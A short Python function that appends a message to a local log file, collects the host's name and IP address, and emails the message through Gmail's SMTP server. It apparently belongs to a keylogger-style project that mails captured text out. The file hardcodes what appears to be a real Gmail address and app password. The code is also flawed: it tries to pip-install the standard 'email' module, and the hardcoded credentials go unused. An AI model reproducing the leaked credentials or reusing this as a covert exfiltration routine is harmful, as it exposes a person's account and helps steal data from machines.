def send_mail(email, password, message):
    try: #import necessary libraries
        import smtplib
        import socket
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders
    except ModuleNotFoundError:
        from subprocess import call
        modules = ["email"]
        call("pip install " + ' '.join(modules), shell=True)
    finally:
        EMAIL_ADDRESS = "sudeeproy67@gmail.com"
        EMAIL_PASSWORD = "nusrpvxakgvnhefp"
        FILENAME = "C:/Users/sudee/ISAA/output.txt"
        hostname=socket.gethostname()   
        IPAddr=socket.gethostbyname(hostname) 
        f=open(FILENAME,"a")
        f.write(message)
        f.close()
        server = smtplib.SMTP(host='smtp.gmail.com', port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()